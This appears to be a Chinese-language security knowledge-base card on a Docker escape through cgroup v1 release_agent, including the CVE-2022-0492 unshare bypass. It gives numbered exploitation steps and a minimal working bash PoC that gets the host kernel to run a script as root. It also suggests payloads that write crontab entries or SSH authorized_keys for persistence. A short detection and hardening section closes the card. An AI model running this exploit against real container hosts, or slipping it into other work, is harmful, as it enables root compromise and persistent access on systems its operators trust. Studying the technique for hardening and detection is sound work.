---
id: cloud-container-docker-cgroup-release-agent-escape
title: Docker 容器 cgroup v1 notify_on_release 逃逸：挂载 cgroup 改 release_agent 指向 overlay upperdir 的 payload，内核以宿主机 root 执行（含 CVE-2022-0492 无 CAP_SYS_ADMIN 绕过）
type: scenario
domain: cloud
path: cloud/container
technique: docker-cgroup-release-agent-escape
aliases:
- notify_on_release 逃逸
- release_agent 容器逃逸
- cgroup v1 docker escape
- CVE-2022-0492
- unshare cgroup namespace 绕过
- upperdir 路径求宿主路径
tags:
- docker
- container
- escape
- cgroup
- release-agent
- notify-on-release
- kernel
- cve-2022-0492
cve:
- CVE-2022-0492
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: CVE-2022-0492 影响 Linux v2.6.24-rc1 及以上，修复于 v5.17-rc3 及以上；notify_on_release 机制本身为 cgroup v1 特性
verification:
  verified_by: verifier-V571
  verified_at: '2026-11-12T09:32:17+08:00'
  notes: 已对照原文与全部15张截图核对：图04 notify_on_release流程图、图05 mount -t cgroup 子系统列表、图06 cgroup memory 文件、图07 /etc/mtab overlay upperdir、图08 实测完整exp（mkdir/mount -o memory、notify_on_release=1、host_path sed upperdir、/cmd payload、release_agent、cgroup.procs 触发，宿主机 ls / 出现 pwned）与卡内步骤/PoC 一致；文中 chmod a+x /c m d 为排版笔误，图08 实为 /cmd，卡内已按正确写法。CVE-2022-0492 版本区间原文明确（v2.6.24-rc1 及以上受影响，修复 v5.17-rc3 及以上，原文称修复补丁限制 release_agent 权限），卡内 affected_versions 与原文一致、保留；unshare -UrmC 绕过与 --security-opt apparmor/seccomp=unconfined 亦与原文一致。dedup：privileged 挂盘、core_pattern、host procfs、SUID docker、环境识别卡均 related 非同链（release_agent 内核回调机制独有）；dup-scan 无本卡 pair。图12/13 docker.sock 与图14/15 proc core_pattern 属既有卡覆盖的 skip 项，未建卡正确。未执行文中命令。
---

## 一句话结论

在可挂载/写入 cgroup v1 的 Docker 容器内，创建子 cgroup 并设置 `notify_on_release=1`，把 `release_agent` 指向容器内脚本（路径按 `/etc/mtab` 的 overlay `upperdir` 换算成宿主机路径），再向该子 cgroup 的 `cgroup.procs` 写入一个即将退出的进程；该 cgroup 最后一个任务退出时，内核在宿主机以 root 权限执行 `release_agent`，脚本即在宿主机根目录落地（如创建 `/pwned`、写 crontab/authorized_keys），完成容器逃逸；无 `CAP_SYS_ADMIN` 的旧内核（CVE-2022-0492）可用 `unshare -UrmC` 嵌套命名空间绕过挂载限制。

## 原理

- **cgroup v1 与 release_agent**：cgroup v1 把资源控制器挂成文件系统（`/sys/fs/cgroup/<subsystem>`）。`notify_on_release` 为 1 时，当该 cgroup 中最后一个任务退出，内核会执行 root cgroup 的 `release_agent` 文件所指向的程序；该程序运行在**初始命名空间/宿主机 root 上下文**，路径也按宿主机解析。
- **容器内为何可挂载**：Docker 默认给容器部分 cgroup 挂载/权限（取决于内核与配置）；若容器内可 `mount -t cgroup` 并写入新子组，即可自行设置 `notify_on_release` 与 `release_agent`。
- **宿主机路径换算**：容器根是 OverlayFS，`/etc/mtab` 中可见 `lowerdir=/var/lib/docker/overlay2/l/...`、`upperdir=/var/lib/docker/overlay2/<id>/diff`、`workdir=...`。容器内写入 `/cmd` 实际落在 upperdir 的 `diff` 目录；`host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)` 得到该宿主路径，`release_agent` 写 `$host_path/cmd` 即宿主机可执行路径。
- **触发**：`sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"` 把当前 shell 放进子 cgroup，shell 退出后子 cgroup 清空，内核执行 release_agent（宿主机 root）→ 脚本执行 `touch /pwned` 等命令。
- **CVE-2022-0492 绕过**：修复前内核只要 AppArmor/seccomp 不拦（`--security-opt apparmor=unconfined --security-opt seccomp=unconfined`），即使容器无 `CAP_SYS_ADMIN` 不能直接 mount cgroup，也可用 `unshare -UrmC` 新建 user+mount+cgroup namespace，在新命名空间里获得 mount 权限并再挂 cgroup（rdma 等子系统），后续步骤相同；v5.17-rc3 的修复限制了无 CAP_SYS_ADMIN 时写 release_agent 的能力。
- **为什么成立**：release_agent 是内核回调、执行上下文为宿主机 root，写入的脚本位于宿主机文件系统（overlay upperdir），容器隔离在触发点被完全绕过。

## 触发条件

- 容器内可写 cgroup v1（能 mount cgroup 或已有可写挂载点），且能创建子 cgroup、设置 `notify_on_release`/`release_agent`。
- 或满足 CVE-2022-0492：内核 < v5.17-rc3，容器 apparmor/seccomp 为 unconfined，可用 `unshare -UrmC` 绕过 mount 限制。
- overlay2 存储驱动（默认），`/etc/mtab` 可读以取 upperdir；目标脚本由宿主机 root 执行，写宿主机路径。
- 使用 cgroup v2 的环境此链不适用（无 release_agent 机制）。

## 利用步骤

1. 挂载 cgroup：`mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp`。
2. 创建子组：`mkdir /tmp/cgrp/x`。
3. 打开通知：`echo 1 > /tmp/cgrp/x/notify_on_release`。
4. 取宿主机路径：`host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)`。
5. 写 payload：`echo '#!/bin/sh' > /cmd; echo "touch /pwned" >> /cmd; chmod a+x /cmd`。
6. 设置 release_agent：`echo "$host_path/cmd" > /tmp/cgrp/release_agent`。
7. 触发：`sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`，进程退出后宿主机出现 `/pwned`（或把 payload 换成写 crontab/ssh key）。
8. CVE-2022-0492 变体（无 CAP_SYS_ADMIN）：容器以 `--security-opt apparmor=unconfined --security-opt seccomp=unconfined` 启动；`unshare -UrmC test; mkdir /tmp/cgroup && mount -t cgroup -o rdma cgroup /tmp/cgroup`，之后接步骤 2–7。

最小化 PoC：

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab`
echo '#!/bin/sh' > /cmd
echo "touch /pwned" >> /cmd
chmod a+x /cmd
echo "$host_path/cmd" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## 变体与关联

- CVE-2022-0492 是 Linux 内核缺陷而非 Docker 本身：无 CAP_SYS_ADMIN 时通过 user/mount/cgroup namespace 嵌套获得 cgroup 挂载能力，修复于 v5.17-rc3。
- release_agent payload 可替换为写 `/etc/cron.d/x`、`/root/.ssh/authorized_keys`、systemd 服务等持久化/凭据手段。
- 相关容器逃逸路径：特权容器挂载宿主机磁盘；挂载宿主机 procfs 改 core_pattern；挂载 docker.sock 调用 daemon。三条链共同点是容器被授予了宿主机级的文件/设备/管理面访问。
- 检测 cgroup v2/新版内核/默认 AppArmor 下该链失效，需按目标内核版本判断。

## 检测与防御

- 升级内核到 v5.17-rc3 及以上，或使用 cgroup v2（无 release_agent）；确认 Docker 默认 seccomp/AppArmor profile 未被放宽。
- 不以 `--privileged`/`--cap-add SYS_ADMIN` 运行不可信容器；限制容器内 cgroup 挂载与写权限（drop CAP_SYS_ADMIN、只读 cgroup）。
- 运行时检测：容器内 `mount -t cgroup`、写 `release_agent`、`unshare` 新建命名空间、向 cgroup.procs 写入后立即退出等行为；监控宿主机新增文件/计划任务/authorized_keys 变更。
